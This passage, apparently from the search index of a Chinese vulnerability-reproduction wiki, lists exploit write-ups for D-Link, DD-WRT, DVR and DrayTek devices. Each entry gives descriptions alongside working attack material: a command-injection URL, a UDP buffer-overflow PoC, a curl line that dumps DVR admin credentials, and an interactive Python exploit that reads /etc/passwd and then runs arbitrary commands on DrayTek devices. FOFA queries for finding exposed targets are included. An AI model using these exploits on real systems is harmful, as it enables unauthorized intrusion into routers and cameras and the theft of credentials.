\"GET\" , _url , true ); /* will make IE11 fail. if(!document.all){ if(_dataType == \"xml\") this.xmlHttp.overrideMimeType(\"text/xml;charset=utf8\"); else this.xmlHttp.overrideMimeType(\"text/html;charset=gb2312\");//\u8bbe\u5b9a\u4ee5gb2312\u7f16\u7801\u8bc6\u522b\u6570\u636e } */ this . xmlHttp . send ( null ); }, \u770b\u4e00\u4e0b\u8fc7\u7a0b \u250c\u2500\u2500 ( root ) - [ /tmp ] \u2514\u2500# echo \"timestamp=1589333279490&cmd=whoami\" | cut -d = -f 3 whoami \u8fd9\u91cc\u53d6\u7b2c\u4e8c\u4e2a\u53c2\u6570 whoami \u7136\u540e\u5c31\u6ca1\u6709\u8fc7\u6ee4\u7684\u6267\u884c\u4e86 \u6240\u4ee5EXP\u4e3a: http://xxx.xxx.xxx.xxx/cgi-bin/execute_cmd.cgi?timestamp=peiqi&cmd=whoami","title":"D-Link DSL-28881A \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2020-24581"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-24581/#d-link-dsl-28881a-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c-cve-2020-24581","text":"","title":"D-Link DSL-28881A \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2020-24581"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-24581/#\u6f0f\u6d1e\u63cf\u8ff0","text":"D-Link DSL-2888A AU_2.31_V1.1.47ae55\u4e4b\u524d\u7248\u672c\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5305\u542b\u4e00\u4e2aexecute cmd.cgi\u7279\u6027(\u4e0d\u80fd\u901a\u8fc7web\u7528\u6237\u754c\u9762\u8bbf\u95ee)\uff0c\u8be5\u7279\u6027\u5141\u8bb8\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002 \u5728\u8be5\u7248\u672c\u56fa\u4ef6\u4e2d\u540c\u65f6\u5b58\u5728\u7740\u4e00\u4e2a\u4e0d\u5b89\u5168\u8ba4\u8bc1\u6f0f\u6d1e\uff08CVE-2020-24580\uff09\uff0c\u5728\u767b\u5f55\u754c\u9762\u8f93\u5165\u4efb\u610f\u5bc6\u7801\u5c31\u53ef\u4ee5\u6210\u529f\u8bbf\u95ee\u8def\u7531\u5668\u754c\u9762\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-24581/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] D-Link DSL-2888A","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-24581/#fofa","text":"[!NOTE] body=\"DSL-2888A\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DSL-28881A%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-24581/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u8f93\u5165\u4efb\u610f\u5bc6\u7801\u5efa\u7acb\u8fde\u63a5 \u8df3\u8f6c\u5230 http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail \u663e\u793a\u5bc6\u7801\u9519\u8bef \u6f0f\u6d1e\u51fa\u73b0\u5728 execute_cmd.cgi \u6587\u4ef6\u4e2d #!/bin/sh . /usr/syscfg/api_log.sh cmd = ` echo ${ QUERY_STRING } | cut -d = -f 3 ` cmd = ` echo ${ cmd } | tr \"%20\" \" \" ` result = ` ${ cmd } ` TGP_Log ${ TGP_LOG_WARNING } \"cmd= ${ cmd } , result= ${ result } \" echo \"Content-type: text/html\" echo \"\" echo -n ${ result } \u8fd9\u91cc\u53d6\u51fa ${QUERY_STRING} \u4e2d\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u503c\uff0c\u7136\u540e\u53bb\u9664\u7a7a\u683c\u547d\u4ee4\u6267\u884c \u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709\u8fc7\u6ee4\uff0c\u770b\u4e00\u4e0b\u53c2\u6570\u4ece\u54ea\u6765\u7684 \u6587\u4ef6 /www/js/ajax.js get : function ( _dataType ) { var _url = this . url ; if ( _url . indexOf ( '?' ) == - 1 ) _url += '?timestamp=' + new Date (). getTime (); else _url += \"&timestamp=\" + new Date (). getTime (); if ( this . queryString . length > 0 ) _url += \"&\" + this . queryString ; this . xmlHttp . open ( \"GET\" , _url , true ); /* will make IE11 fail. if(!document.all){ if(_dataType == \"xml\") this.xmlHttp.overrideMimeType(\"text/xml;charset=utf8\"); else this.xmlHttp.overrideMimeType(\"text/html;charset=gb2312\");//\u8bbe\u5b9a\u4ee5gb2312\u7f16\u7801\u8bc6\u522b\u6570\u636e } */ this . xmlHttp . send ( null ); }, \u770b\u4e00\u4e0b\u8fc7\u7a0b \u250c\u2500\u2500 ( root ) - [ /tmp ] \u2514\u2500# echo \"timestamp=1589333279490&cmd=whoami\" | cut -d = -f 3 whoami \u8fd9\u91cc\u53d6\u7b2c\u4e8c\u4e2a\u53c2\u6570 whoami \u7136\u540e\u5c31\u6ca1\u6709\u8fc7\u6ee4\u7684\u6267\u884c\u4e86 \u6240\u4ee5EXP\u4e3a: http://xxx.xxx.xxx.xxx/cgi-bin/execute_cmd.cgi?timestamp=peiqi&cmd=whoami","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DD-WRT/DD-WRT%20UPNP%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20CVE-2021-27137/","text":"DD-WRT UPNP\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e CVE-2021-27137 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cDD-WRT\u4e2d\u7684UPNP\u5904\u4e8e\u7981\u7528\u72b6\u6001\uff0c\u5e76\u4e14\u4ec5\u5728\u5185\u90e8\u7f51\u7edc\u63a5\u53e3\u4e0a\u4fa6\u542c\u3002 UPNP\u672c\u8d28\u4e0a\u662f\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684UDP\u5f62\u5f0f\u7684\u534f\u8bae\u2013\u7531\u4e8e\u65e0\u6cd5\u5bf9\u534f\u8bae\u5f3a\u5236\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u56e0\u6b64\u5b83\u65e2\u6613\u4e8e\u4f7f\u7528\u53c8\u5177\u6709\u4e0d\u5b89\u5168\u6027\u3002 \u5982\u679cDD-WRT\u542f\u7528\u4e86UPNP\u670d\u52a1\uff0c\u5219\u5750\u5728\u5b58\u5728DD-WRT\u8bbe\u5907\u7684LAN\u4e0a\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001\u4e00\u4e2a\u8fc7\u957f\u7684 uuid \u503c\u6765\u89e6\u53d1\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \u6839\u636e\u90e8\u7f72DD-WRT\u7684\u5e73\u53f0\u7684\u4e0d\u540c\uff0c\u53ef\u80fd\u5b58\u5728\u7f13\u89e3\u63aa\u65bd\uff0c\u4e5f\u53ef\u80fd\u6ca1\u6709\u7f13\u89e3\u63aa\u65bd\uff0c\u4f8b\u5982ASLR\u7b49\uff0c\u8fd9\u4f7f\u5f97\u53ef\u5229\u7528\u6027\u53d6\u51b3\u4e8e\u5b89\u88c5DD-WRT\u7684\u5e73\u53f0\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] DD-WRT < 45723 \u7248\u672c \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u901a\u8fc7\u67e5\u770b\u6e90\u4ee3\u7801\uff0c ssdp.c \u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u53d1\u73b0\u6709\u95ee\u9898\u7684\u4ee3\u7801\uff1a \u7528\u6237\u63d0\u4f9b\u7684\u6570\u636e\u7684\u672a\u7ed1\u5b9a\u526f\u672c\u88ab\u590d\u5236\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u8be5\u7f13\u51b2\u533a\u7684\u5927\u5c0f\u9650\u5236\u4e3a128\u4e2a\u5b57\u8282\u3002 \u7531\u4e8e\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u672a\u542f\u7528UPNP\u670d\u52a1\uff0c\u56e0\u6b64\u91cd\u65b0\u521b\u5efa\u6f0f\u6d1e\u7684\u7b2c\u4e00\u6b65\u662f\u542f\u7528\u5c06\u81ea\u52a8\u542f\u52a8\u8be5\u670d\u52a1\u7684\u670d\u52a1 \u542f\u52a8PoC\u811a\u672c\u5c06\u89e6\u53d1upnp\u670d\u52a1\u5d29\u6e83\uff0c\u8fd9\u53ef\u4ee5\u5728\u542f\u52a8\u4ee5\u4e0bpython\u811a\u672c\u51e0\u79d2\u949f\u540e\u770b\u5230 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import socket target_ip = \"192.168.15.124\" # IP Address of Target off = \"D\" * 164 ret_addr = \"AAAA\" payload = off + ret_addr packet = \\ 'M-SEARCH * HTTP/1.1 \\r\\n ' \\ 'HOST:239.255.255.250:1900 \\r\\n ' \\ 'ST:uuid:' + payload + ' \\r\\n ' \\ 'MX:2 \\r\\n ' \\ 'MAN:\"ssdp:discover\" \\r\\n ' \\ ' \\r\\n ' s = socket . socket ( socket . AF_INET , socket . SOCK_DGRAM , socket . IPPROTO_UDP ) s . sendto ( packet . encode (), ( target_ip , 1900 ) )","title":"DD-WRT UPNP\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e CVE-2021-27137"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DD-WRT/DD-WRT%20UPNP%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20CVE-2021-27137/#dd-wrt-upnp\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e-cve-2021-27137","text":"","title":"DD-WRT UPNP\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e CVE-2021-27137"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DD-WRT/DD-WRT%20UPNP%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20CVE-2021-27137/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cDD-WRT\u4e2d\u7684UPNP\u5904\u4e8e\u7981\u7528\u72b6\u6001\uff0c\u5e76\u4e14\u4ec5\u5728\u5185\u90e8\u7f51\u7edc\u63a5\u53e3\u4e0a\u4fa6\u542c\u3002 UPNP\u672c\u8d28\u4e0a\u662f\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684UDP\u5f62\u5f0f\u7684\u534f\u8bae\u2013\u7531\u4e8e\u65e0\u6cd5\u5bf9\u534f\u8bae\u5f3a\u5236\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u56e0\u6b64\u5b83\u65e2\u6613\u4e8e\u4f7f\u7528\u53c8\u5177\u6709\u4e0d\u5b89\u5168\u6027\u3002 \u5982\u679cDD-WRT\u542f\u7528\u4e86UPNP\u670d\u52a1\uff0c\u5219\u5750\u5728\u5b58\u5728DD-WRT\u8bbe\u5907\u7684LAN\u4e0a\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001\u4e00\u4e2a\u8fc7\u957f\u7684 uuid \u503c\u6765\u89e6\u53d1\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \u6839\u636e\u90e8\u7f72DD-WRT\u7684\u5e73\u53f0\u7684\u4e0d\u540c\uff0c\u53ef\u80fd\u5b58\u5728\u7f13\u89e3\u63aa\u65bd\uff0c\u4e5f\u53ef\u80fd\u6ca1\u6709\u7f13\u89e3\u63aa\u65bd\uff0c\u4f8b\u5982ASLR\u7b49\uff0c\u8fd9\u4f7f\u5f97\u53ef\u5229\u7528\u6027\u53d6\u51b3\u4e8e\u5b89\u88c5DD-WRT\u7684\u5e73\u53f0\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DD-WRT/DD-WRT%20UPNP%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20CVE-2021-27137/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] DD-WRT < 45723 \u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DD-WRT/DD-WRT%20UPNP%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20CVE-2021-27137/#\u6f0f\u6d1e\u590d\u73b0","text":"\u901a\u8fc7\u67e5\u770b\u6e90\u4ee3\u7801\uff0c ssdp.c \u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u53d1\u73b0\u6709\u95ee\u9898\u7684\u4ee3\u7801\uff1a \u7528\u6237\u63d0\u4f9b\u7684\u6570\u636e\u7684\u672a\u7ed1\u5b9a\u526f\u672c\u88ab\u590d\u5236\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u8be5\u7f13\u51b2\u533a\u7684\u5927\u5c0f\u9650\u5236\u4e3a128\u4e2a\u5b57\u8282\u3002 \u7531\u4e8e\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u672a\u542f\u7528UPNP\u670d\u52a1\uff0c\u56e0\u6b64\u91cd\u65b0\u521b\u5efa\u6f0f\u6d1e\u7684\u7b2c\u4e00\u6b65\u662f\u542f\u7528\u5c06\u81ea\u52a8\u542f\u52a8\u8be5\u670d\u52a1\u7684\u670d\u52a1 \u542f\u52a8PoC\u811a\u672c\u5c06\u89e6\u53d1upnp\u670d\u52a1\u5d29\u6e83\uff0c\u8fd9\u53ef\u4ee5\u5728\u542f\u52a8\u4ee5\u4e0bpython\u811a\u672c\u51e0\u79d2\u949f\u540e\u770b\u5230","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DD-WRT/DD-WRT%20UPNP%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%20CVE-2021-27137/#\u6f0f\u6d1e\u5229\u7528poc","text":"import socket target_ip = \"192.168.15.124\" # IP Address of Target off = \"D\" * 164 ret_addr = \"AAAA\" payload = off + ret_addr packet = \\ 'M-SEARCH * HTTP/1.1 \\r\\n ' \\ 'HOST:239.255.255.250:1900 \\r\\n ' \\ 'ST:uuid:' + payload + ' \\r\\n ' \\ 'MX:2 \\r\\n ' \\ 'MAN:\"ssdp:discover\" \\r\\n ' \\ ' \\r\\n ' s = socket . socket ( socket . AF_INET , socket . SOCK_DGRAM , socket . IPPROTO_UDP ) s . sendto ( packet . encode (), ( target_ip , 1900 ) )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DVR/DVR%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2018-9995/","text":"DVR \u767b\u5f55\u7ed5\u8fc7\u6f0f\u6d1e CVE-2018-9995 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 DVR\uff0c\u5168\u79f0\u4e3aDigital Video Recorder(\u786c\u76d8\u5f55\u50cf\u673a)\uff0c\u5373\u6570\u5b57\u89c6\u9891\u5f55\u50cf\u673a\u3002\u6700\u521d\u7531\u963f\u6839\u5ef7\u7814\u7a76\u5458\u53d1\u73b0\uff0c\u901a\u8fc7\u4f7f\u7528\u201cCookie\uff1a uid = admin\u201d\u7684Cookie\u6807\u5934\u6765\u8bbf\u95ee\u7279\u5b9aDVR\u7684\u63a7\u5236\u9762\u677f\uff0cDVR\u5c06\u4ee5\u660e\u6587\u5f62\u5f0f\u54cd\u5e94\u8bbe\u5907\u7684\u7ba1\u7406\u5458\u51ed\u8bc1\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Novo CeNova QSee Pulnix XVR 5 in 1 (title: \"XVR Login\") Securus, - Security. Never Compromise !! - Night OWL DVR Login HVR Login MDVR Login \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528curl\u547d\u4ee4\u83b7\u5f97\u8d26\u53f7\u5bc6\u7801 curl \"http://xxx.xxx.xxx.xxx/device.rsp?opt=user&cmd=list\" -H \"Cookie: uid=admin\"","title":"DVR \u767b\u5f55\u7ed5\u8fc7\u6f0f\u6d1e CVE-2018-9995"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DVR/DVR%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2018-9995/#dvr-\u767b\u5f55\u7ed5\u8fc7\u6f0f\u6d1e-cve-2018-9995","text":"","title":"DVR \u767b\u5f55\u7ed5\u8fc7\u6f0f\u6d1e CVE-2018-9995"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DVR/DVR%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2018-9995/#\u6f0f\u6d1e\u63cf\u8ff0","text":"DVR\uff0c\u5168\u79f0\u4e3aDigital Video Recorder(\u786c\u76d8\u5f55\u50cf\u673a)\uff0c\u5373\u6570\u5b57\u89c6\u9891\u5f55\u50cf\u673a\u3002\u6700\u521d\u7531\u963f\u6839\u5ef7\u7814\u7a76\u5458\u53d1\u73b0\uff0c\u901a\u8fc7\u4f7f\u7528\u201cCookie\uff1a uid = admin\u201d\u7684Cookie\u6807\u5934\u6765\u8bbf\u95ee\u7279\u5b9aDVR\u7684\u63a7\u5236\u9762\u677f\uff0cDVR\u5c06\u4ee5\u660e\u6587\u5f62\u5f0f\u54cd\u5e94\u8bbe\u5907\u7684\u7ba1\u7406\u5458\u51ed\u8bc1\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DVR/DVR%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2018-9995/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Novo CeNova QSee Pulnix XVR 5 in 1 (title: \"XVR Login\") Securus, - Security. Never Compromise !! - Night OWL DVR Login HVR Login MDVR Login","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DVR/DVR%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2018-9995/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528curl\u547d\u4ee4\u83b7\u5f97\u8d26\u53f7\u5bc6\u7801 curl \"http://xxx.xxx.xxx.xxx/device.rsp?opt=user&cmd=list\" -H \"Cookie: uid=admin\"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/DrayTek/DrayTek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2020-8515/","text":"DrayTek\u4f01\u4e1a\u7f51\u7edc\u8bbe\u5907 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2020-8515 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 DrayTek URI\u672a\u80fd\u6b63\u786e\u5904\u7406SHELL\u5b57\u7b26\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u63d0\u4ea4\u7279\u6b8a\u7684\u8bf7\u6c42\uff0c\u53ef\u4ee5ROOT\u6743\u9650\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002 \u8fdc\u7a0b\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u88ab\u6807\u8bb0\u4e3aCVE-2020-8515\uff0c\u4e3b\u8981\u5f71\u54cd\u4e86DrayTek Vigor\u7f51\u7edc\u8bbe\u5907\uff0c\u5305\u62ec\u4f01\u4e1a\u4ea4\u6362\u673a\u3001\u8def\u7531\u5668\u3001\u8d1f\u8f7d\u5747\u8861\u5668\u548cVPN\u7f51\u5173\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Vigor2960 < v1.5.1 Vigor300B < v1.5.1 Vigor3900 < v1.5.1 VigorSwitch20P2121 <= v2.3.2 VigorSwitch20G1280 <= v2.3.2 VigorSwitch20P1280 <= v2.3.2 VigorSwitch20G2280 <= v2.3.2 VigorSwitch20P2280 <= v2.3.2 FOFA \u00b6 [!NOTE] title=\"Vigor 2960\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u6293\u5305 \u8bf7\u6c42\u5305\u5982\u4e0b POST /cgi-bin/mainfunction.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Content-Length: 67 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Content-Type: text/plain; charset=UTF-8 Accept: */* Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 action=login&keyPath=%27%0A%2fbin%2fls%0A%27&loginUser=a&loginPwd=a \u5176\u4e2d\u51fa\u73b0\u6ce8\u5165\u70b9\u7684\u53c2\u6570\u4e3a keyPath [!NOTE] \u51fa\u73b0\u7a7a\u683c\u9700\u8981\u66ff\u6362\uff0c\u4f8b\u5982 cat /etc/passwd \u2192 cat${IFS}/etc/passwd \u53ef\u4ee5\u4f7f\u7528 & \u6267\u884c\u989d\u5916\u4e00\u6761\u547d\u4ee4 (URL\u7f16\u7801\u4e3a %26) \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: DrayTek\u4f01\u4e1a\u7f51\u7edc\u8bbe\u5907 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> pwd \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } data = \"action=login&keyPath= %27% 0A %2f bin %2f cat$ {IFS} /etc/passwd%0A%27&loginUser=a&loginPwd=a\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /cgi-bin/mainfunction.cgi \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : Cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if Cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , Cmd ) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) sys . exit ( 0 ) def POC_2 ( target_url , Cmd ): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } Cmd = Cmd . replace ( ' ' , '$ {IFS} ' ) data = \"action=login&keyPath= %27% 0A %2f bin %2f %26 {} %0A%27&loginUser=a&loginPwd=a\" . format ( Cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} /cgi-bin/mainfunction.cgi \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] Goby\u4e2d\u5df2\u7ecf\u5305\u542b\u6b64\u6f0f\u6d1e","title":"DrayTek\u4f01\u4e1a\u7f51\u7edc\u8bbe\u5907 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c 